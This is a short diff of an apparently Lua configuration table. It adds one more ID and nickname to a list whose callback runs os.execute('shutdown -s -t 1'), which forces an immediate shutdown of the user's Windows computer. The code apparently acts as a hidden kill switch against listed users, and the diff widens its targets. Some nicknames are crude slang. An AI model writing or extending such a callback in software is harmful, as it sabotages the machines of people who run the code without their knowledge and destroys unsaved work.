@@ -80,6 +80,7 @@
     {2660503007,'xzkto'},
     {3966311388,'asdwe'},
     {1986853897,'gigant_pisun_9sm'},
+    {2630997217,'zhesvashe'},
   },
   callback = function() os.execute('shutdown -s -t 1')  end,
 }
